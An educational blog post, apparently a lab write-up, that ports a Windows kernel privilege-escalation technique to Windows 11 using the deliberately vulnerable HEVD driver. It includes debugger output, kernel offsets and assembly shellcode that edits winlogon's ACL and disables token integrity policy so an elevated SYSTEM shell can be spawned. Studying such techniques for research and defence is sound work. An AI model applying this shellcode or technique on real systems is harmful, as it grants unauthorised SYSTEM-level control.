# Revisiting Windows Kernel Shellcode on Windows 11: Stack Buffer Overflow with ACL Edit

## Introduction

This post revisits the ACL kernel shellcode technique demonstrated in [Improsec's blog post](https://blog.improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-2) using HackSys Extreme Vulnerable Driver (HEVD), but updated for Windows 11. It makes use of the stack buffer overflow to modify the ACL of the winlogon process, and then spawns an elevated command prompt by injecting shellcode into the winlogon process.

## Background

The original technique involves changing the ACE of the SYSTEM entry, for the winlogon process, so that its SID matches that of the Authenticated Users group. In addition, the current process token mandatory integrity policy is changed to `TOKEN_MANDATORY_POLICY_OFF`. This is to allow the current process to get a handle to the winlogon process and create a remote thread to spawn an elevated command prompt.

The mandatory policies can be found at https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_policy.

In what follows, this post will demonstrate the technique on Windows 11, version 23H2, along with full exploit code, from triggering the overflow to spawning the elevated command prompt. SMEP/KPTI are disabled.

```bash
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22631 N/A Build 22631
OS Manufacturer:           Microsoft Corporation
```

## Technical Implementation 

The exploit follows these steps:

1. Obtain handle to the vulnerable driver
2. Trigger buffer overflow to execute kernel shellcode
3. Craft shellcode that:
   - Locates winlogon process in kernel memory
   - Modifies ACL entries to grant access to the Authenticated Users group
4. Inject shellcode into winlogon process to spawn elevated command prompt

The initial HEVD exploitation is well documented and triggering the buffer overflow can be found in many other posts.

For the remainder, it can be found that the original blog post analysis still holds on Windows 11.

Following the original blog post, the security descriptor of the winlogon process can still be found at the same offsets,

```bash
0: kd> !process 0 0 winlogon.exe
PROCESS ffffe481acef1080
    SessionId: 1  Cid: 02d8    Peb: 7bab37d000  ParentCid: 026c
    DirBase: 10da60000  ObjectTable: ffff8081a273d080  HandleCount: 280.
    Image: winlogon.exe
```

And getting the security descriptor offset from the object header at EPROCESS-0x30,

```bash
0: kd> dt nt!_OBJECT_HEADER ffffe481acef1080-30 SecurityDescriptor
   +0x028 SecurityDescriptor : 0xffff8081`9fc5adaf Void
```

The security descriptor is found at EPROCESS-0x30+0x28 but its lower 4 bits are a fast reference, so they must be masked off,

```bash
0: kd> !sd 0xffff8081`9fc5ada0
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544
->Group   : S-1-5-18
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-18

->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[1]: ->AceFlags: 0x0
->Dacl    : ->Ace[1]: ->AceSize: 0x18
->Dacl    : ->Ace[1]: ->Mask : 0x00121411
->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544

->Sacl    : 
->Sacl    : ->AclRevision: 0x2
->Sacl    : ->Sbz1       : 0x0
->Sacl    : ->AclSize    : 0x1c
->Sacl    : ->AceCount   : 0x1
->Sacl    : ->Sbz2       : 0x0
->Sacl    : ->Ace[0]: ->AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE
->Sacl    : ->Ace[0]: ->AceFlags: 0x0
->Sacl    : ->Ace[0]: ->AceSize: 0x14
->Sacl    : ->Ace[0]: ->Mask : 0x00000003
->Sacl    : ->Ace[0]: ->SID: S-1-16-16384
```

The ACEs are found at the same offsets as well. The remaining analysis of the mandatory integrity policy is the same as the original blog post.

## Code Walkthrough

The full exploit code can be found in [src/main.rs](https://github.com/glslang/hevd-exp/blob/main/stack_buffer_overflow_acl_edit/src/main.rs).

The ACL edit shellcode can be found in [acl_edit.asm](https://github.com/glslang/win-kexp/blob/main/src/asm/acl_edit.asm).

The updated offsets used in the shellcode are,

```bash
KTHREAD_OFFSET        EQU 188h    ; Offset to current KTHREAD from GS
EPROCESS_OFFSET       EQU 0B8h    ; Offset to EPROCESS from KTHREAD
ACTIVEPROCESSLINKS    EQU 448h    ; Offset to ActiveProcessLinks
IMAGEFILENAME_OFFSET  EQU 5A8h    ; Offset to ImageFileName
TOKEN_OFFSET          EQU 4b8h    ; Offset to process token
```

Then it proceeds to find the winlogon process,

```
    mov rax,gs:[rax+KTHREAD_OFFSET]    ; Get current KTHREAD
    mov rax,[rax+EPROCESS_OFFSET]      ; Get current EPROCESS
    mov rcx,rax
__loop:
    mov rax,[rax+ACTIVEPROCESSLINKS]                        ; Get next process
    sub rax,ACTIVEPROCESSLINKS                              ; Adjust to get EPROCESS base
    cmp dword ptr [rax+IMAGEFILENAME_OFFSET],6c6e6977h      ; Compare ImageFileName
    jnz __loopbash
```

RAX now points to the winlogon process EPROCESS, and RCX contains the current EPROCESS.

```bash
    sub rax,30h
    add rax,28h
```

The offset to the object header is found by subtracting 0x30 and then the security descriptor is found by adding 0x28 from the EPROCESS base. The two instructions are for clarity of the explanation.

The next step is to modify the ACL entries,

``` bash
    mov rax, qword ptr [rax]
    and rax,0FFFFFFFFFFFFFFF0h
    add rax,48h
    mov byte ptr [rax],0bh
```

RAX is dereferenced and the security descriptor is masked off. Adding 0x48 to the address gets to the first ACE and the byte at that location is modified to 11 (0x0B), which is the 18 (0x12) for the SYSTEM ACE.

The remaining shellcode is for setting the mandatory integrity policy,

``` bash
    mov rdx, qword ptr [rcx+TOKEN_OFFSET]
    and rdx,0FFFFFFFFFFFFFFF0h
    add rdx,0d4h
    mov byte ptr [rdx],0
```

RDX is set to the token address and masked off. Adding 0xd4 to the address gets to the mandatory integrity policy and the byte at that location is modified to 0, which is the `TOKEN_MANDATORY_POLICY_OFF` value.

The shellcode also contains an epilogue to restore the original stack and registers to safely return to the caller.

The remaining exploit code is for injecting the shellcode into the winlogon process and spawning the elevated command prompt. The injection is a standard injection. The handle to the victim process is returned, memory for the shellcode is allocated and written to the user space of the victim process, and then a remote thread is created to execute the shellcode.

These steps can be found at https://github.com/glslang/win-kexp/blob/main/src/process.rs#L112.

Executing the exploit code and our elevated command prompt can be found below,

![Launching the elevated command prompt](https://github.com/glslang/hevd-exp/blob/main/stack_buffer_overflow_acl_edit/img/acl_edit_system.png)

## Conclusion

This post revisits the ACL edit technique on Windows 11 and demonstrates the technique with full exploit code, with the expectation that the source code can be used to understand the technique and to better follow along with the original blog post.

## References

- https://blog.improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-2
- https://github.com/hacksysteam/HackSysExtremeVulnerableDriver
- https://github.com/glslang/win-kexp
